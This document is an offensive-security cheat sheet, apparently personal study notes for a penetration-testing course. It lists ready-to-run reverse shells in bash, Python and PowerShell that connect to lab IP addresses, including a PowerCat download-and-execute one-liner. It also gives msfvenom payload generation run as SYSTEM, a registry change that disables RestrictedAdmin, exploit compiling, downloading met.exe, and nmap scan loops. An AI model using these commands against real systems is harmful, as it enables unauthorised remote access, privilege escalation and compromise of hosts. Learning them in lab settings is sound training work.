| **Reverse shells**                                                                                                                                     | **Description**                                 |
| ------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------- |
| `bash -i >& /dev/tcp/192.168.119.3/4444 0>&1`                                                                                                          | Common reverse shell                            |
| `bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"`                                                                                                | If prior shell doesn't work due to Bourne Shell |
| `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.190",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'` | Python reverse shell                            |
| `IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.190/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell`            | Powershell reverse shell with PowerCat          |

| **Netcat listener** | **Description** |
| ---- | ---- |
| `nc -nvlp 9001` | In port 9001 |

| **Banner grabbing** | **Description** |
| ---- | ---- |
| `telnet 10.10.10.10 22` | For ip 10.10.10.10 in port 22 |


Google dork to search exploits (Instead of searchsploit):
```text
phpMyAdmin 4.9.2 site:exploit-db.com
```

Extract metadata from a file

```
exiftool -a -u brochure.pdf
```

#### Windows

When we are admin but cannot execute commands as nt authority\\system we can use this two powershell scripts (**[Invoke-CommandAs](https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs/Public/Invoke-CommandAs.ps1) and **[Invoke-ScheduledTask.ps1](https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps1)**)
```shell
*Evil-WinRM* PS C:\> Import-Module .\Invoke-CommandAs.ps1
*Evil-WinRM* PS C:\> Import-Module .\Invoke-ScheduledTask.ps1
*Evil-WinRM* PS C:\> Invoke-CommandAs -ScriptBlock {whoami} -AsSystem
	nt authority\system
```
We can create a msfvenom exe payload and catch the shell with a meterpreter session
```shell
kali # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.204 LPORT=443 -f exe -o shell.exe
----
*Evil-WinRM* PS C:\> Invoke-CommandAs -ScriptBlock {C:\Users\Administrator\Documents\shell.exe} -AsSystem
----
msf6 exploit(multi/handler) > run
[*] Command shell session 1 opened (192.168.45.204:443 -> 192.168.222.147:60443) at 2024-02-29 13:46:59 +0100
```

When xfreerdp admin doesn't work
```shell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

PS - Enable terminal color (for WinPeas for example)
```shell
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

PS - Get local user
```shell
Get-LocalUser
```

PS - List IP and hostnames in AD environment
```shell
Get-ADComputer -Filter * | Select-Object DNSHostName, @{name="Ip";Expression={(Test-Connection $_.DNSHostname -Count 1).IPV4Address.IPAddressToString}}
```

Check current shell:
```shell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

Cross-platform exploit compiling:
```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
```

If we get errors due to the linker cannot find the winsock library:
```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

Find filename:
```shell
dir -Path C:\  -Include flag.txt -File -Recurse -ErrorAction SilentlyContinue
```

Retrieve a file in Powershell (same as wget)
```shell
iwr -uri http://192.168.119.2/met.exe -Outfile met.exe
```

| Enumerating                                                                                                                                                                                                                                                                                                 | **Description**                  |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------- |
| `for i in $(cat ../internal-network.txt); do mkdir -p $i/nmap; nmap -p- --min-rate=10000 --open $i -oA "$i/nmap/quick-scan"; done`                                                                                                                                                                          | Quick scan from scope file       |
| `mkdir nmap`<br>`for i in $(cat scope.txt); do sudo nmap -p- --min-rate=10000 --open $i -oG nmap/$i; done`<br>`cd nmap`<br>`for i in $(ls \| grep -v '.nmap'); do extractPorts $i; export clipboard_content=`xclip -o -selection clipboard`; nmap -p $clipboard_content -sCV -A -T4 $i -oN "$i.nmap"; done` | Script to process scope.txt file |

**Phising:** Refer to PEN-200 content, 24.3.2 module and use swaks